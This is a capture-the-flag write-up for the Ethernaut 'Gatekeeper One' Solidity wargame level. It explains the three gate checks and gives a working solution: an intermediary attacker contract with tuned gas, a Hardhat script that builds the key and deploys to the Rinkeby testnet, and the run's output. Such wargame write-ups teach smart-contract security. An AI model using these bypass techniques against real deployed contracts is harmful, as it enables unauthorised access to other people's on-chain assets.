---
title: Ethernaut #13 Gatekeeper One
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Gatekeeper One challenge writeup
---

## Gatekeeper One

### Challenge

Make it past the gatekeeper and register as an entrant to pass this level.

#### Things that might help:

* Remember what you've learned from the Telephone and Token levels.
* You can learn more about the special function `gasleft()`, in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Background

This challenge is rather simple. It mainly has multiple conditions in order that need to be satisfied in order to pass the challenge. The only thing that is not trivial is how to get the `gasleft` to be a multiple of `8191`.

### Attack

In order to enter, three `modifier`s need to be satisfied, the first require the `msg.sender` and `tx.origin` to be different. This can be achieved using a smart contract to trigger the `enter` function. Then the `gas` needs to be estimated such that it has a remainder of `8191` when `gasleft()` is reached. Finally the `_gateKey` needs to have some non-zero value for the 4 MSB, then two zeros and then the last two bytes of the `tx.origin`.

* Create a contract that:
  * calls the `GatekeeperOne` `enter` function
  * has a specific `gas` associated with the `enter` function
* Generate the `_gateKey` by:
  * Using `0x00000001` as the MSB
  * Then `0x0000` as the next two bytes
  * Finally the last two bytes of `tx.origin`
* Trigger the attacker controlled contract to call the `enter` function

#### GatekeeperOneSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import '../challenges/GatekeeperOne.sol';

contract GatekeeperOneSolve {

    constructor() public {}
    
    function enter (address payable _gatekeeperOneAddress, bytes8 _gateKey) public payable {
        GatekeeperOne gatekeeperOneContrtact = GatekeeperOne(_gatekeeperOneAddress);
        gatekeeperOneContrtact.enter{gas: 868500}(_gateKey);
    }

}
```

In order to deduce the gas amount I used remix, debuged the contract execution in the remix vm, and checked what the `gas` opcode pushed onto the stack. I then found how much i needed to add (or subtract) in order for that value to be a multiple of 8191 and I added it to the `gas` I provided. I then had to reduce the value a bit when executing for the rinkeby network, because I set a the `gas` lower in my `hardhat.config.js`.

#### gatekeeper-one-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    gatekeeperOneAddress = "0x24315b9ab5e38cF2F6126F7827D2EB3aC5296b27";
    contract = await ethers.getContractAt("GatekeeperOne", gatekeeperOneAddress);
    
    const accounts = await hre.ethers.getSigners();
    account = accounts[0];
    
    GatekeeperOneSolve = await ethers.getContractFactory("GatekeeperOneSolve");
    gatekeeperOneSolve = await GatekeeperOneSolve.deploy();
    await gatekeeperOneSolve.deployed();

    console.log("Initial entrant: " + await contract.entrant())

    // generate the gate key
    gateKey = ethers.utils.hexZeroPad(ethers.utils.hexConcat([
        "0x01", 
        "0x0000", 
        ethers.utils.hexDataSlice(account.address, 18)
    ]), 8)

    console.log(gateKey)

    // submit the gate key
    tx = await gatekeeperOneSolve.connect(account).enter(contract.address, gateKey)
    receipt = await tx.wait()

    console.log("Entrant        : " + await contract.entrant())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash$ npx hardhat run scripts/gatekeeper-one-solve.js --network rinkeby
Initial entrant: 0x0000000000000000000000000000000000000000
0x000000010000276d
Entrant        : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

Well done! Next, try your hand with the second gatekeeper...
